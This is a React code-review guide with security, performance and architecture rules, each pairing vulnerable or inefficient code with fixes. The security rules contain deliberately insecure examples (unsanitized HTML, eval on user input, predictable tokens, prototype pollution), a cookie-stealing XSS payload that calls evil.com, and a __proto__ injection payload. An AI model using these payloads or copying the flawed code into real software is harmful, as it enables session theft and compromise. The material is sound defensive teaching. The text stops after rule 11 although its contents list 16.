# BeforeMerge: react-review

Comprehensive code review knowledge base for React applications (framework-agnostic). Contains rules across security, performance, architecture, and quality categories. Each rule includes detailed explanations, real-world examples comparing incorrect vs. correct implementations, impact ratings, and formal weakness mappings (CWE) to guide both AI agents and human reviewers.

## Table of Contents

### 1. Security Anti-Patterns (CRITICAL)
- 1. Sanitize Content Before dangerouslySetInnerHTML — CRITICAL [CWE-79]
- 2. Never Use eval() or new Function() with User Input — CRITICAL [CWE-95]
- 3. Use Cryptographic Randomness for Tokens and IDs — CRITICAL [CWE-338]
- 4. Prevent Prototype Pollution from Untrusted Input — CRITICAL [CWE-1321]
### 2. Performance Patterns (HIGH)
- 5. Split Large Contexts to Prevent Unnecessary Consumer Re-renders — HIGH
- 6. Memoize Expensive Computations with useMemo — HIGH
- 7. Virtualize Large Lists Instead of Rendering All Items — HIGH
- 8. Avoid Inline Object/Array/Function Creation in JSX Props — HIGH
### 3. Architecture Patterns (MEDIUM)
- 9. Prefer Composition Over Monolithic Conditional Rendering — MEDIUM
- 10. Extract Duplicated Stateful Logic into Custom Hooks — MEDIUM
- 11. Eliminate Prop Drilling Through 3+ Component Levels — MEDIUM
- 12. Colocate State with the Components That Use It — MEDIUM
### 4. Code Quality (LOW-MEDIUM)
- 13. Do Not Mix Controlled and Uncontrolled Input Patterns — MEDIUM
- 14. Add Error Boundaries Around Unreliable UI Sections — MEDIUM
- 15. Never Use Array Index as Key for Dynamic Lists — MEDIUM
- 16. Always Clean Up useEffect Side Effects — MEDIUM

---

## Rules

## Sanitize Content Before dangerouslySetInnerHTML

**Impact: CRITICAL (prevents cross-site scripting (XSS) attacks)**

React escapes all content rendered via JSX by default, which is a strong XSS defense. However, `dangerouslySetInnerHTML` explicitly bypasses this protection. If the HTML string originates from user input, an API response, a CMS, or any untrusted source, an attacker can inject `<script>` tags, event handlers (`onerror`, `onload`), or malicious `<iframe>` elements that execute arbitrary JavaScript in the user's browser.

**Incorrect (unsanitized user content injected directly):**

```tsx
function Comment({ body }: { body: string }) {
  // ❌ User-supplied HTML rendered without any sanitization
  return <div dangerouslySetInnerHTML={{ __html: body }} />
}

function CmsPage({ html }: { html: string }) {
  // ❌ CMS content may contain injected scripts
  return <article dangerouslySetInnerHTML={{ __html: html }} />
}
```

An attacker submitting `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">` as a comment body steals every reader's session cookie.

**Correct (sanitize with DOMPurify before rendering):**

```tsx
import DOMPurify from 'dompurify'

function Comment({ body }: { body: string }) {
  // ✅ Sanitized — strips scripts, event handlers, and dangerous tags
  const clean = DOMPurify.sanitize(body)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

function CmsPage({ html }: { html: string }) {
  // ✅ Restrict to safe subset of HTML
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'title'],
  })
  return <article dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**Additional context:**

- Prefer rendering structured data via JSX instead of raw HTML whenever possible.
- If you must render HTML, DOMPurify is the most battle-tested sanitization library. Alternatives include `sanitize-html` and `isomorphic-dompurify` for SSR.
- Server-side sanitization alone is not sufficient if the client later modifies the HTML. Sanitize at the point of rendering.

**Detection hints:**

```bash
# Find all uses of dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
# Check if DOMPurify is imported in those files
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" -l | xargs grep -L "DOMPurify\|sanitize"
```

Reference: [React docs on dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)

---

## Never Use eval() or new Function() with User Input

**Impact: CRITICAL (prevents arbitrary JavaScript execution in the user's browser)**

`eval()`, `new Function()`, `setTimeout(string)`, and `setInterval(string)` all parse and execute strings as JavaScript. If any part of the string originates from user input — URL parameters, form fields, API responses, postMessage events — an attacker can execute arbitrary code in the user's browser context. This grants access to cookies, localStorage, the DOM, and any API the user can call.

**Incorrect (executing user-controlled strings):**

```tsx
// ❌ eval with user input for "dynamic filtering"
function applyFilter(filterExpression: string, data: any[]) {
  return data.filter((item) => eval(filterExpression))
}

// ❌ new Function() with user-controlled template
function renderTemplate(template: string, context: Record<string, unknown>) {
  const fn = new Function('ctx', `return \`${template}\``)
  return fn(context)
}

// ❌ setTimeout with string argument
function scheduleAction(userCode: string) {
  setTimeout(userCode, 1000)
}

// ❌ innerHTML with user content (bypasses React's escaping)
function RawContent({ html }: { html: string }) {
  const ref = useRef<HTMLDivElement>(null)
  useEffect(() => {
    if (ref.current) {
      ref.current.innerHTML = html  // ❌ XSS vector
    }
  }, [html])
  return <div ref={ref} />
}
```

**Correct (use safe alternatives):**

```tsx
// ✅ Use a predefined set of filter functions instead of eval
const FILTERS: Record<string, (item: Product) => boolean> = {
  inStock: (item) => item.quantity > 0,
  onSale: (item) => item.discount > 0,
  premium: (item) => item.price > 100,
}

function applyFilter(filterName: string, data: Product[]) {
  const filterFn = FILTERS[filterName]
  if (!filterFn) throw new Error(`Unknown filter: ${filterName}`)
  return data.filter(filterFn)
}

// ✅ Use template literals with explicit interpolation
function renderTemplate(template: string, context: Record<string, string>) {
  return template.replace(/\{\{(\w+)\}\}/g, (_, key) => {
    return context[key] ?? ''
  })
}

// ✅ setTimeout with function reference, not string
function scheduleAction(action: () => void) {
  setTimeout(action, 1000)
}

// ✅ Use dangerouslySetInnerHTML with DOMPurify (see sec-dangerouslysetinnerhtml rule)
import DOMPurify from 'dompurify'

function RawContent({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}
```

**Additional context:**

- CSP (Content Security Policy) headers with `script-src` directives can block `eval()` and `new Function()` at the browser level, providing defense in depth. Set `'unsafe-eval'` only if absolutely necessary.
- If you truly need a sandboxed expression evaluator (e.g., for a spreadsheet formula feature), use a dedicated parser like `expr-eval` or `mathjs` that does not execute arbitrary JavaScript.
- ESLint rule `no-eval` catches `eval()` but not `new Function()` — enable `no-new-func` as well.

**Detection hints:**

```bash
# Find eval, new Function, and string-based setTimeout/setInterval
grep -rn "eval(\|new Function(\|setTimeout(\s*['\"\`]\|setInterval(\s*['\"\`]" src/ --include="*.ts" --include="*.tsx"
# Find direct innerHTML assignments
grep -rn "\.innerHTML\s*=" src/ --include="*.ts" --include="*.tsx"
```

Reference: [MDN eval() — Never use eval!](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!)

---

## Use Cryptographic Randomness for Tokens and IDs

**Impact: CRITICAL (prevents predictable tokens that enable session hijacking or enumeration attacks)**

`Math.random()` uses a pseudo-random number generator (PRNG) that is not cryptographically secure. Its output can be predicted if an attacker observes enough values, and some engines seed it with low-entropy sources. When used to generate session tokens, CSRF tokens, password reset links, unique IDs for access control, or nonces, an attacker can predict or brute-force subsequent values.

**Incorrect (using Math.random() for security-sensitive values):**

```tsx
// ❌ Predictable token generation
function generateToken(): string {
  return Math.random().toString(36).substring(2)
}

// ❌ Predictable unique IDs used for access control
function createInviteLink(teamId: string): string {
  const code = Math.random().toString(36).slice(2, 10)
  return `https://app.example.com/invite/${teamId}/${code}`
}

// ❌ Predictable CSRF nonce
function generateNonce(): string {
  return `nonce-${Math.random()}`
}
```

**Correct (using crypto APIs for secure randomness):**

```tsx
// ✅ crypto.randomUUID() — available in all modern browsers and Node 19+
function generateToken(): string {
  return crypto.randomUUID()
}

// ✅ crypto.getRandomValues() for custom-length tokens
function generateSecureCode(length: number = 32): string {
  const array = new Uint8Array(length)
  crypto.getRandomValues(array)
  return Array.from(array, (b) => b.toString(16).padStart(2, '0')).join('')
}

// ✅ Secure invite link
function createInviteLink(teamId: string): string {
  const code = crypto.randomUUID()
  return `https://app.example.com/invite/${teamId}/${code}`
}
```

**Additional context:**

- `Math.random()` is fine for non-security purposes: shuffling UI elements, generating placeholder data, animations, or randomizing display order.
- `crypto.randomUUID()` is available in browsers (all major since 2022) and Node.js 19+. For older Node.js, use `require('crypto').randomUUID()`.
- If you need a nanoid-style short ID, the `nanoid` package uses `crypto.getRandomValues()` internally and is a safe alternative.

**Detection hints:**

```bash
# Find Math.random() used near token/id/key generation
grep -rn "Math\.random()" src/ --include="*.ts" --include="*.tsx"
```

Reference: [MDN crypto.randomUUID()](https://developer.mozilla.org/en-US/docs/Web/API/Crypto/randomUUID)

---

## Prevent Prototype Pollution from Untrusted Input

**Impact: CRITICAL (prevents prototype pollution leading to privilege escalation or denial of service)**

When you spread or `Object.assign` untrusted data (API responses, form submissions, URL params) directly into an object, an attacker can inject `__proto__`, `constructor`, or `prototype` keys. This pollutes the global `Object.prototype`, affecting every object in the application. Consequences include authentication bypasses (`isAdmin` becoming truthy on all objects), denial of service, or remote code execution in server-side contexts.

**Incorrect (spreading untrusted API data directly into state or config):**

```tsx
// ❌ API response spread directly — attacker can send { "__proto__": { "isAdmin": true } }
async function updateProfile(userId: string) {
  const data = await fetch(`/api/users/${userId}`).then(r => r.json())
  const profile = { ...defaultProfile, ...data }
  return profile
}

// ❌ Form data spread without filtering
function handleSubmit(formData: Record<string, unknown>) {
  const settings = Object.assign({}, currentSettings, formData)
  saveSettings(settings)
}
```

**Correct (validate and pick only known keys):**

```tsx
import { z } from 'zod'

const ProfileSchema = z.object({
  name: z.string().max(100),
  email: z.string().email(),
  bio: z.string().max(500).optional(),
})

// ✅ Parse with a schema — unknown keys are stripped
async function updateProfile(userId: string) {
  const raw = await fetch(`/api/users/${userId}`).then(r => r.json())
  const data = ProfileSchema.parse(raw)
  const profile = { ...defaultProfile, ...data }
  return profile
}

// ✅ Alternatively, pick only known keys explicitly
function handleSubmit(formData: Record<string, unknown>) {
  const safeData = {
    theme: typeof formData.theme === 'string' ? formData.theme : currentSettings.theme,
    locale: typeof formData.locale === 'string' ? formData.locale : currentSettings.locale,
  }
  saveSettings({ ...currentSettings, ...safeData })
}
```

**Additional context:**

- Libraries like Zod, Yup, and Valibot strip unknown keys by default during `.parse()`, making them a natural defense.
- `Object.create(null)` creates objects without a prototype, which can serve as safe containers for dynamic keys.
- This applies to any context where external data is merged: API responses, WebSocket messages, URL search params, localStorage, postMessage events.

**Detection hints:**

```bash
# Find Object.assign with dynamic data
grep -rn "Object\.assign" src/ --include="*.ts" --include="*.tsx"
# Find spread of variables from fetch/API calls
grep -rn "\.\.\.data\|\.\.\.response\|\.\.\.body\|\.\.\.payload" src/ --include="*.ts" --include="*.tsx"
```

Reference: [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)

---

## Split Large Contexts to Prevent Unnecessary Consumer Re-renders

**Impact: HIGH (prevents cascade re-renders across the entire component tree)**

React Context triggers a re-render of **every** consumer whenever the context value changes — there is no built-in selector mechanism. When a single context holds many unrelated pieces of state (user data, theme, notifications, feature flags), changing any one value re-renders every component that subscribes to that context. In large applications, a single "god context" can cause hundreds of unnecessary re-renders.

**Incorrect (one giant context for all app state):**

```tsx
// ❌ Every consumer re-renders when ANY of these values change
interface AppState {
  user: User | null
  theme: 'light' | 'dark'
  notifications: Notification[]
  sidebarOpen: boolean
  locale: string
}

const AppContext = createContext<AppState & { dispatch: Dispatch }>(null!)

function AppProvider({ children }: { children: ReactNode }) {
  const [state, dispatch] = useReducer(appReducer, initialState)

  // ❌ New object on every state change — every consumer re-renders
  return (
    <AppContext.Provider value={{ ...state, dispatch }}>
      {children}
    </AppContext.Provider>
  )
}

// These components ALL re-render when sidebar opens, even though they
// don't use sidebarOpen
function NavBar() {
  const { user } = useContext(AppContext)  // ❌ Re-renders on theme change too
  return <nav>{user?.name}</nav>
}

function ThemeToggle() {
  const { theme, dispatch } = useContext(AppContext)  // ❌ Re-renders on notification change
  return <button onClick={() => dispatch({ type: 'TOGGLE_THEME' })}>{theme}</button>
}
```

**Correct (split into focused, single-purpose contexts):**

```tsx
// ✅ Each context holds only related state
const AuthContext = createContext<{ user: User | null; login: () => void; logout: () => void }>(null!)
const ThemeContext = createContext<{ theme: 'light' | 'dark'; toggleTheme: () => void }>(null!)
const NotificationContext = createContext<{ notifications: Notification[]; dismiss: (id: string) => void }>(null!)
const SidebarContext = createContext<{ open: boolean; toggle: () => void }>(null!)

// ✅ Compose providers (or use a utility to reduce nesting)
function AppProviders({ children }: { children: ReactNode }) {
  return (
    <AuthProvider>
      <ThemeProvider>
        <NotificationProvider>
          <SidebarProvider>
            {children}
          </SidebarProvider>
        </NotificationProvider>
      </ThemeProvider>
    </AuthProvider>
  )
}

// ✅ Only re-renders when user changes
function NavBar() {
  const { user } = useContext(AuthContext)
  return <nav>{user?.name}</nav>
}

// ✅ Only re-renders when theme changes
function ThemeToggle() {
  const { theme, toggleTheme } = useContext(ThemeContext)
  return <button onClick={toggleTheme}>{theme}</button>
}
```

**Additional context:**

- A common pattern is to split context into a "state context" and a "dispatch context." Components that only call actions (dispatch) don't need to re-render when state changes.
- For complex state that many components need to read selectively, consider a state management library with selectors: Zustand, Jotai, or Redux Toolkit. These allow subscribing to specific slices of state.
- `useMemo` on the context value only helps if the individual values haven't changed. It does not help if the context holds frequently-changing values alongside stable ones.
- React DevTools Profiler can highlight which components re-render and why, making it easy to identify context-triggered re-renders.

**Detection hints:**

```bash
# Find large context definitions (look for interfaces/types with many fields)
grep -rn "createContext" src/ --include="*.tsx" --include="*.ts"
# Find components consuming context
grep -rn "useContext" src/ --include="*.tsx" --include="*.ts"
```

Reference: [React docs on useContext](https://react.dev/reference/react/useContext)

---

## Memoize Expensive Computations with useMemo

**Impact: HIGH (prevents jank and slow interactions caused by redundant heavy computation)**

React components re-render frequently — on state changes, context updates, and parent re-renders. If a component performs expensive work on every render (sorting thousands of items, parsing data, computing aggregates, building complex data structures), this blocks the main thread and makes the UI feel sluggish. `useMemo` caches the result and only recomputes when its dependencies change.

**Incorrect (expensive computation runs on every render):**

```tsx
function AnalyticsDashboard({ transactions }: { transactions: Transaction[] }) {
  // ❌ Sorts and aggregates 10,000+ transactions on every render
  // Even a keystroke in an unrelated input triggers this
  const sorted = [...transactions].sort((a, b) => b.amount - a.amount)
  const topMerchants = computeTopMerchants(transactions)
  const monthlyTotals = transactions.reduce((acc, t) => {
    const month = t.date.slice(0, 7)
    acc[month] = (acc[month] ?? 0) + t.amount
    return acc
  }, {} as Record<string, number>)

  return (
    <div>
      <MerchantChart data={topMerchants} />
      <MonthlyChart data={monthlyTotals} />
      <TransactionTable data={sorted} />
    </div>
  )
}
```

**Correct (memoize expensive work so it only recomputes when dependencies change):**

```tsx
function AnalyticsDashboard({ transactions }: { transactions: Transaction[] }) {
  // ✅ Only recomputes when `transactions` reference changes
  const sorted = useMemo(
    () => [...transactions].sort((a, b) => b.amount - a.amount),
    [transactions]
  )

  const topMerchants = useMemo(
    () => computeTopMerchants(transactions),
    [transactions]
  )

  const monthlyTotals = useMemo(
    () =>
      transactions.reduce((acc, t) => {
        const month = t.date.slice(0, 7)
        acc[month] = (acc[month] ?? 0) + t.amount
        return acc
      }, {} as Record<string, number>),
    [transactions]
  )

  return (
    <div>
      <MerchantChart data={topMerchants} />
      <MonthlyChart data={monthlyTotals} />
      <TransactionTable data={sorted} />
    </div>
  )
}
```

**Additional context:**

- `useMemo` is not free — it has a small overhead for tracking dependencies. Only use it when the computation is measurably expensive (typically > 1ms or involving 1,000+ items).
- For filtering and sorting based on user input (search, sort column), `useMemo` ensures the work only happens when the input or data changes, not on every keystroke of unrelated state.
- If the expensive computation is in a synchronous event handler (not during render), you do not need `useMemo`. Only render-path computations benefit from memoization.
- Profile first with React DevTools Profiler or `console.time()` before adding `useMemo`.

**Detection hints:**

```bash
# Find .sort(), .filter(), .reduce() on large datasets during render (without useMemo wrapping)
grep -rn "\.sort(\|\.filter(\|\.reduce(" src/ --include="*.tsx" --include="*.jsx"
```

Reference: [React docs on useMemo](https://react.dev/reference/react/useMemo)

---

## Virtualize Large Lists Instead of Rendering All Items

**Impact: HIGH (prevents UI freezes and excessive memory consumption from large lists)**

Rendering a `.map()` over thousands of items creates thousands of DOM nodes, all of which the browser must lay out, paint, and keep in memory. This causes multi-second initial render times, high memory usage, and scroll jank as the browser struggles to manage thousands of elements. Virtualization renders only the items currently visible in the viewport (plus a small overscan buffer), typically reducing the DOM node count from thousands to 20-50.

**Incorrect (rendering all items in the DOM):**

```tsx
function TransactionList({ transactions }: { transactions: Transaction[] }) {
  // ❌ If transactions has 10,000 items, this creates 10,000 DOM nodes
  return (
    <div className="transaction-list">
      {transactions.map((tx) => (
        <TransactionRow key={tx.id} transaction={tx} />
      ))}
    </div>
  )
}
```

**Correct (virtualize with react-window or TanStack Virtual):**

```tsx
import { useVirtualizer } from '@tanstack/react-virtual'
import { useRef } from 'react'

function TransactionList({ transactions }: { transactions: Transaction[] }) {
  const parentRef = useRef<HTMLDivElement>(null)

  // ✅ Only renders visible items + small overscan buffer
  const virtualizer = useVirtualizer({
    count: transactions.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 48, // estimated row height in px
    overscan: 10,
  })

  return (
    <div ref={parentRef} style={{ height: 600, overflow: 'auto' }}>
      <div style={{ height: virtualizer.getTotalSize(), position: 'relative' }}>
        {virtualizer.getVirtualItems().map((virtualItem) => {
          const tx = transactions[virtualItem.index]
          return (
            <div
              key={tx.id}
              style={{
                position: 'absolute',
                top: virtualItem.start,
                height: virtualItem.size,
                width: '100%',
              }}
            >
              <TransactionRow transaction={tx} />
            </div>
          )
        })}
      </div>
    </div>
  )
}
```

**With react-window (simpler API):**

```tsx
import { FixedSizeList as List } from 'react-window'

function TransactionList({ transactions }: { transactions: Transaction[] }) {
  // ✅ Only visible rows are rendered
  return (
    <List height={600} itemCount={transactions.length} itemSize={48} width="100%">
      {({ index, style }) => (
        <div style={style}>
          <TransactionRow transaction={transactions[index]} />
        </div>
      )}
    </List>
  )
}
```

**Additional context:**

- As a rule of thumb, virtualize when rendering more than ~100-200 items. Below that threshold, the overhead of virtualization may not be worth it.
- For variable-height rows, use `VariableSizeList` (react-window) or set `estimateSize` dynamically with `measureElement` (TanStack Virtual).
- Virtualization also benefits tables (TanStack Virtual has table examples), grids, and tree views.
- Combine virtualization with `React.memo` on row components for best results.

**Detection hints:**

```bash
# Find .map() calls that might render large lists
grep -rn "\.map(" src/ --include="*.tsx" --include="*.jsx"
# Check if virtualization libraries are installed
grep -rn "react-window\|react-virtualized\|@tanstack/react-virtual" package.json
```

Reference: [TanStack Virtual documentation](https://tanstack.com/virtual/latest)

---

## Avoid Inline Object/Array/Function Creation in JSX Props

**Impact: HIGH (prevents unnecessary re-renders that degrade UI responsiveness)**

Every time a parent component renders, inline expressions like `style={{ margin: 8 }}`, `options={[1, 2, 3]}`, or `onClick={() => doThing(id)}` create brand-new object/array/function references. When these are passed as props to child components, React's shallow comparison sees them as changed — even when the values are identical — causing the child to re-render. This is especially costly when the child is a complex component, a memoized component (defeating `React.memo`), or appears in a list.

**Incorrect (inline creation forces re-renders on every parent render):**

```tsx
function UserList({ users }: { users: User[] }) {
  return (
    <div>
      {users.map((user) => (
        <UserCard
          key={user.id}
          user={user}
          // ❌ New object every render — defeats React.memo on UserCard
          style={{ padding: 16, borderRadius: 8 }}
          // ❌ New array every render
          roles={['viewer']}
          // ❌ New function every render
          onSelect={() => selectUser(user.id)}
        />
      ))}
    </div>
  )
}
```

**Correct (stable references via constants, useMemo, and useCallback):**

```tsx
// ✅ Extract static values outside the component
const cardStyle = { padding: 16, borderRadius: 8 }
const defaultRoles = ['viewer']

function UserList({ users }: { users: User[] }) {
  // ✅ useCallback for stable function reference
  const handleSelect = useCallback((userId: string) => {
    selectUser(userId)
  }, [])

  return (
    <div>
      {users.map((user) => (
        <UserCard
          key={user.id}
          user={user}
          style={cardStyle}
          roles={defaultRoles}
          onSelect={handleSelect}
        />
      ))}
    </div>
  )
}

// If the child component is expensive, wrap it with React.memo
const UserCard = React.memo(function UserCard({
  user,
  style,
  roles,
  onSelect,
}: UserCardProps) {
  return (
    <div style={style} onClick={() => onSelect(user.id)}>
      {user.name}
    </div>
  )
})
```

**Additional context:**

- This optimization matters most when: (1) the child component is wrapped in `React.memo`, (2) the list is large, or (3) the parent re-renders frequently (e.g., on every keystroke).
- For components that are not memoized and have trivial render logic, the overhead of inline creation is negligible. Do not prematurely optimize every prop.
- React Compiler (React 19+) can auto-memoize these patterns, but explicit stable references remain best practice until Compiler adoption is widespread.
- Use the React DevTools Profiler's "Why did this render?" feature to identify unnecessary re-renders caused by referential inequality.

**Detection hints:**

```bash
# Find inline style objects in JSX
grep -rn "style={{" src/ --include="*.tsx" --include="*.jsx"
# Find inline arrow functions in JSX props (common pattern)
grep -rn "={().*=>.*}" src/ --include="*.tsx" --include="*.jsx"
```

Reference: [React docs on useMemo](https://react.dev/reference/react/useMemo)

---

## Prefer Composition Over Monolithic Conditional Rendering

**Impact: MEDIUM (improves readability, testability, and extensibility of component APIs)**

When a single component handles many variants through deeply nested ternaries, long chains of `if/else`, or numerous boolean props (`isLoading`, `isEmpty`, `isError`, `isCompact`, `isAdmin`), it becomes a "god component" that is difficult to understand, test, and extend. Each new variant adds more branching, increasing cyclomatic complexity. Composition patterns — `children`, render props, compound components — distribute responsibility across focused, testable units.

**Incorrect (monolithic conditional rendering):**

```tsx
// ❌ One component handling every state, variant, and layout
function DataDisplay({
  data,
  isLoading,
  error,
  isEmpty,
  isCompact,
  isAdmin,
  onRetry,
}: DataDisplayProps) {
  if (isLoading) {
    return isCompact ? <SmallSpinner /> : <FullPageLoader />
  }
  if (error) {
    return (
      <div>
        <p>{error.message}</p>
        {isAdmin ? <pre>{error.stack}</pre> : null}
        <button onClick={onRetry}>Retry</button>
      </div>
    )
  }
  if (isEmpty) {
    return isCompact ? <span>No data</span> : <EmptyState />
  }
  return isCompact ? (
    <CompactTable data={data} showAdminCols={isAdmin} />
  ) : (
    <FullTable data={data} showAdminCols={isAdmin} />
  )
}
```

**Correct (composition with focused components):**

```tsx
// ✅ Compound component pattern — each state is a focused component
function DataView({ children }: { children: ReactNode }) {
  return <div className="data-view">{children}</div>
}

DataView.Loading = function Loading({ children }: { children?: ReactNode }) {
  return children ?? <FullPageLoader />
}

DataView.Error = function Error({
  error,
  onRetry,
  children,
}: {
  error: Error
  onRetry: () => void
  children?: ReactNode
}) {
  return (
    <div role="alert">
      <p>{error.message}</p>
      {children}
      <button onClick={onRetry}>Retry</button>
    </div>
  )
}

DataView.Empty = function Empty({ children }: { children?: ReactNode }) {
  return children ?? <EmptyState />
}

// ✅ Usage — clear, flat, easy to follow
function UserDashboard() {
  const { data, isLoading, error, refetch } = useUsers()

  if (isLoading) return <DataView.Loading />
  if (error) return <DataView.Error error={error} onRetry={refetch} />
  if (!data?.length) return <DataView.Empty />

  return (
    <DataView>
      <UserTable data={data} />
    </DataView>
  )
}
```

**With render props for flexible injection:**

```tsx
// ✅ Render prop pattern for customizable list items
function List<T>({
  items,
  renderItem,
  keyExtractor,
}: {
  items: T[]
  renderItem: (item: T, index: number) => ReactNode
  keyExtractor: (item: T) => string
}) {
  return (
    <ul>
      {items.map((item, i) => (
        <li key={keyExtractor(item)}>{renderItem(item, i)}</li>
      ))}
    </ul>
  )
}
```

**Additional context:**

- Compound components (like `<Tabs>`, `<Tabs.Panel>`, `<Tabs.List>`) are the gold standard for complex UI components. They share state implicitly via context while exposing a flexible, composable API.
- The `children` prop is the simplest form of composition and should be the first approach considered.
- When a component has more than 3 boolean variant props, it is a strong signal to refactor into composed sub-components.

**Detection hints:**

```bash
# Find deeply nested ternaries in JSX
grep -rn "? <" src/ --include="*.tsx" --include="*.jsx"
# Find components with many boolean props
grep -rn "isLoading\|isEmpty\|isError\|isCompact\|isDisabled" src/ --include="*.tsx"
```

Reference: [React docs on composition vs inheritance](https://react.dev/learn/passing-props-to-a-component)

---

## Extract Duplicated Stateful Logic into Custom Hooks

**Impact: MEDIUM (reduces code duplication and ensures consistent behavior across components)**

When the same combination of `useState`, `useEffect`, `useRef`, or `useCallback` appears in multiple components — such as fetching data, managing form state, handling window resize, debouncing input, or tracking online status — each copy is an independent maintenance burden. Bug fixes must be applied in every location, and subtle inconsistencies creep in. Custom hooks encapsulate this logic once, making it testable in isolation and reusable everywhere.

**Incorrect (same fetch + loading + error pattern duplicated across components):**

```tsx
// ❌ Component A
function UserProfile({ userId }: { userId: string }) {
  const [user, setUser] = useState<User | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<Error | null>(null)

  useEffect(() => {
    setLoading(true)
    fetch(`/api/users/${userId}`)
      .then((r) => r.json())
      .then(setUser)
      .catch(setError)
      .finally(() => setLoading(false))
  }, [userId])

  if (loading) return <Spinner />
  if (error) return <ErrorMessage error={error} />
  return <div>{user?.name}</div>
}

// ❌ Component B — exact same pattern, copy-pasted
function TeamMembers({ teamId }: { teamId: string }) {
  const [members, setMembers] = useState<User[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<Error | null>(null)

  useEffect(() => {
    setLoading(true)
    fetch(`/api/teams/${teamId}/members`)
      .then((r) => r.json())
      .then(setMembers)
      .catch(setError)
      .finally(() => setLoading(false))
  }, [teamId])

  if (loading) return <Spinner />
  if (error) return <ErrorMessage error={error} />
  return <MemberList members={members} />
}
```

**Correct (extract shared logic into a custom hook):**

```tsx
// ✅ Custom hook encapsulates the pattern once
function useFetch<T>(url: string) {
  const [data, setData] = useState<T | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<Error | null>(null)

  useEffect(() => {
    const controller = new AbortController()
    setLoading(true)
    setError(null)

    fetch(url, { signal: controller.signal })
      .then((r) => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`)
        return r.json()
      })
      .then(setData)
      .catch((err) => {
        if (err.name !== 'AbortError') setError(err)
      })
      .finally(() => setLoading(false))

    return () => controller.abort()  // ✅ proper cleanup
  }, [url])

  return { data, loading, error }
}

// ✅ Components become thin and focused
function UserProfile({ userId }: { userId: string }) {
  const { data: user, loading, error } = useFetch<User>(`/api/users/${userId}`)
  if (loading) return <Spinner />
  if (error) return <ErrorMessage error={error} />
  return <div>{user?.name}</div>
}

function TeamMembers({ teamId }: { teamId: string }) {
  const { data: members, loading, error } = useFetch<User[]>(`/api/teams/${teamId}/members`)
  if (loading) return <Spinner />
  if (error) return <ErrorMessage error={error} />
  return <MemberList members={members ?? []} />
}
```

**Additional context:**

- Common candidates for custom hooks: `useDebounce`, `useLocalStorage`, `useMediaQuery`, `useOnClickOutside`, `useIntersectionObserver`, `usePrevious`, `useWindowSize`.
- Custom hooks are testable in isolation using `renderHook` from `@testing-library/react`.
- If your custom hook becomes too complex (> 50 lines, multiple branching paths), it may need to be split further or replaced with a dedicated library (TanStack Query for data fetching, React Hook Form for forms).
- Naming convention: custom hooks must start with `use` to get lint rule enforcement from the Rules of Hooks.

**Detection hints:**

```bash
# Find duplicated useState + useEffect patterns across components
grep -rn "useState.*useEffect\|useEffect.*useState" src/ --include="*.tsx" --include="*.ts"
```

Reference: [React docs on reusing logic with custom hooks](https://react.dev/learn/reusing-logic-with-custom-hooks)

---

## Eliminate Prop Drilling Through 3+ Component Levels

**Impact: MEDIUM (reduces coupling and maintenance burden from deeply threaded props)**

Prop drilling occurs when a prop is passed through multiple intermediate components that don't use it, only to reach a deeply nested component that does. This creates tight coupling between layers, makes refactoring painful (renaming or removing a prop requires touching every intermediate component), and obscures the actual data flow. When props pass through 3+ levels, it is a strong signal to restructure.

**Incorrect (prop drilled through 3 intermediate components):**

```tsx
// ❌ App > Layout > Sidebar > NavMenu > UserAvatar — user prop threaded through all layers
function App() {
  const user = useUser()
  return <Layout user={user} />
}

function Layout({ user }: { user: User }) {
  // Layout doesn't use `user` — just passes it down
  return (
    <div>
      <Sidebar user={user} />
      <MainContent />
    </div>
  )
}

function Sidebar({ user }: { user: User }) {
  // Sidebar doesn't use `user` either — just passes it down
  return (
    <nav>
      <NavMenu user={user} />
    </nav>
  )
}

function NavMenu({ user }: { user: User }) {
  return <UserAvatar name={user.name} avatarUrl={user.avatarUrl} />
}
```

**Correct (use composition or context to eliminate intermediaries):**

```tsx
// ✅ Option 1: Component composition — pass the rendered element, not the data
function App() {
  const user = useUser()
  return (
    <Layout
      sidebar={
        <Sidebar>
          <NavMenu>
            <UserAvatar name={user.name} avatarUrl={user.avatarUrl} />
          </NavMenu>
        </Sidebar>
      }
    />
  )
}

function Layout({ sidebar }: { sidebar: ReactNode }) {
  return (
    <div>
      {sidebar}
      <MainContent />
    </div>
  )
}

// ✅ Option 2: Context for widely-used data
const UserContext = createContext<User | null>(null)

function useCurrentUser() {
  const user = useContext(UserContext)
  if (!user) throw new Error('useCurrentUser must be inside UserProvider')
  return user
}

function App() {
  const user = useUser()
  return (
    <UserContext.Provider value={user}>
      <Layout />
    </UserContext.Provider>
  )
}

// NavMenu reads directly from context — no drilling
function NavMenu() {
  const user = useCurrentUser()
  return <UserAvatar name={user.name} avatarUrl={user.avatarUrl} />
}
```

**Additional context:**

- Composition (passing `children` or render slots) is often the simplest fix and avoids the indirection of context. Prefer it when the data consumer is a direct descendant in the JSX tree.
- Context is appropriate when many components at different depths need the same data (theme, auth, locale).
- For complex or frequently-changing shared state, a state management library (Zustand, Jotai, Redux Toolkit) provides selectors and avoids the re-render issues of context.
- One level of prop passing is normal and expected. The threshold for concern is typically 3+ levels of pure pass-through.

**Detection hints:**

```bash
# Look for props being destructured but only passed down to children
grep -rn "props\.\|{ .* }" src/ --include="*.tsx" --include="*.jsx"
```

Reference: [React docs on passing data deeply with context](https://react.dev/learn/passing-data-deeply-with-context)

---

